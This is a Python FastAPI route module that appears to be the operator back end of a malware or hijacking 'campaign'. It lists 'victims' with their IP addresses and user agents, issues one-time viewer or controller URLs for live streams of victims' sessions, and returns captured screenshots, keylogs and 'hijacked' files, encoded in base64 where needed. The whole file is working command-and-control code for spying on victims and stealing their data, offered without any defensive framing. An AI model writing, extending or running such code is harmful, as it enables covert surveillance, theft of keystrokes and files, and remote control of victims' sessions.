"""Private campaign session and stored-artifact routes."""

from .private_common import (
    APIRouter,
    BaseModel,
    Depends,
    Field,
    HTTPException,
    Literal,
    Path,
    base64,
    get_active_victims,
    get_victim,
    get_victim_data,
    httpx,
    json,
    logger,
    settings,
    stream_access,
    verify_api_token,
    ws_manager,
)

api_router = APIRouter()


@api_router.get("/stats")
async def get_stats(auth: str = Depends(verify_api_token)):
    """Get campaign statistics"""
    victims = get_active_victims()

    return {
        "campaign_id": settings.CAMPAIGN_ID,
        "active_sessions": len(victims),
        "total_sessions": len(victims),
        "active_victim_ids": [v['id'] for v in victims]
    }


@api_router.get("/sessions")
async def get_sessions(auth: str = Depends(verify_api_token)):
    """Get all sessions for this campaign"""
    victims = get_active_victims()

    return {
        "sessions": [
            {
                "id": v['id'],
                "ip_address": v['ip_address'],
                "user_agent": v['user_agent'],
                "status": "connected" if v['is_active'] else "disconnected",
                "first_seen": v['first_seen'],
                "last_seen": v['last_seen'],
                "is_ws_connected": ws_manager.is_victim_connected(v['id'])
            }
            for v in victims
        ]
    }


@api_router.get("/sessions/{victim_id}")
async def get_session(victim_id: str, auth: str = Depends(verify_api_token)):
    """Get single session details"""
    victim = get_victim(victim_id)
    if not victim:
        raise HTTPException(status_code=404, detail="Session not found")

    # Parse metadata JSON
    import json
    metadata = {}
    if victim.get('extra_metadata'):
        try:
            metadata = json.loads(victim['extra_metadata'])
        except (json.JSONDecodeError, TypeError) as exc:
            # extra_metadata is written by our own code; a value it can't
            # parse points at a real data problem, not routine user input.
            logger.warning(
                "Could not parse extra_metadata for victim %s: %s",
                victim_id,
                exc,
            )

    return {
        "id": victim['id'],
        "ip_address": victim['ip_address'],
        "user_agent": victim['user_agent'],
        "status": "connected" if victim['is_active'] else "disconnected",
        "collected_info": metadata.get('collected_info', {}),
        "first_seen": victim['first_seen'],
        "last_seen": victim['last_seen'],
        "is_ws_connected": ws_manager.is_victim_connected(victim['id'])
    }


class StreamAccessRequest(BaseModel):
    role: Literal["viewer", "controller"] = "viewer"
    ttl_seconds: int = Field(default=900, ge=30, le=3600)


@api_router.post("/sessions/{victim_id}/stream-access")
async def create_stream_access(
    victim_id: str,
    request: StreamAccessRequest,
    auth: str = Depends(verify_api_token),
):
    """Issue a one-time, role-bound URL for an active victim stream."""
    if not ws_manager.is_victim_connected(victim_id):
        raise HTTPException(status_code=404, detail="Active session not found")
    try:
        access_path = await stream_access.issue(
            victim_id,
            request.role,
            request.ttl_seconds,
        )
    except httpx.HTTPError as exc:
        logger.exception("Failed to configure Selkies access for %s", victim_id)
        raise HTTPException(502, "Selkies control plane is unavailable") from exc

    # Never log access_path itself: it embeds the one-time capability token.
    logger.info(
        "Stream access issued for victim %s (role=%s)",
        victim_id,
        request.role,
    )

    return {
        "access_path": access_path,
        "role": request.role,
        "expires_in": request.ttl_seconds,
    }


@api_router.get("/sessions/{victim_id}/screenshots")
async def get_screenshots(victim_id: str, auth: str = Depends(verify_api_token)):
    """Get screenshots for victim"""
    victim = get_victim(victim_id)
    if not victim:
        raise HTTPException(status_code=404, detail="Session not found")

    # Get from data_collections table
    screenshots = get_victim_data(victim_id, data_type="screenshot")

    return {
        "victim_id": victim_id,
        "count": len(screenshots),
        "screenshots": [
            {
                "filename": Path(s['file_path']).name,
                "path": s['file_path'],
                "size": s['file_size_bytes'],
                "timestamp": (
                    s["collected_at"].isoformat()
                    if hasattr(s.get("collected_at"), "isoformat")
                    else s.get("collected_at")
                )
            }
            for s in screenshots
        ]
    }


@api_router.get("/sessions/{victim_id}/keylogs")
async def get_keylogs(victim_id: str, auth: str = Depends(verify_api_token)):
    """Get keylogs for victim"""
    victim = get_victim(victim_id)
    if not victim:
        raise HTTPException(status_code=404, detail="Session not found")

    keylog_file = Path(settings.STORAGE_PATH) / victim_id / "keylogs.txt"
    max_response_bytes = 5 * 1024 * 1024
    try:
        original_size = keylog_file.stat().st_size
        with keylog_file.open("rb") as stream:
            if original_size > max_response_bytes:
                stream.seek(-max_response_bytes, 2)
            keylog_bytes = stream.read(max_response_bytes)
    except (FileNotFoundError, OSError):
        return {
            "victim_id": victim_id,
            "keylogs": "",
            "size": 0,
            "original_size": 0,
            "truncated": False,
        }

    while keylog_bytes and keylog_bytes[0] & 0xC0 == 0x80:
        keylog_bytes = keylog_bytes[1:]

    return {
        "victim_id": victim_id,
        "keylogs": keylog_bytes.decode("utf-8", errors="replace"),
        "size": len(keylog_bytes),
        "original_size": original_size,
        "truncated": original_size > len(keylog_bytes),
    }


@api_router.get("/sessions/{victim_id}/files_hijacked")
async def get_files_hijacked(victim_id: str, auth: str = Depends(verify_api_token)):
    """Get hijacked files"""
    victim = get_victim(victim_id)
    if not victim:
        raise HTTPException(status_code=404, detail="Session not found")

    # Find files_hijacked directory
    hijacked_dirs = list(Path(settings.STORAGE_PATH).glob(f"{victim_id}/files_hijacked"))

    if not hijacked_dirs:
        return {"victim_id": victim_id, "files": []}

    files_dir = hijacked_dirs[0]
    files = []

    for f in files_dir.glob("*"):
        try:
            if f.suffix in [".txt", ".json", ".xml", ".html"]:
                content = f.read_text(encoding='utf-8', errors='ignore')
                content_type = "text"
            else:
                content = base64.b64encode(f.read_bytes()).decode('utf-8')
                content_type = "base64"

            files.append({
                "filename": f.name,
                "content": content,
                "content_type": content_type,
                "size": f.stat().st_size
            })
        except Exception as e:
            logger.error(f"Error reading {f.name}: {e}")
            continue

    return {
        "victim_id": victim_id,
        "count": len(files),
        "files": files
    }
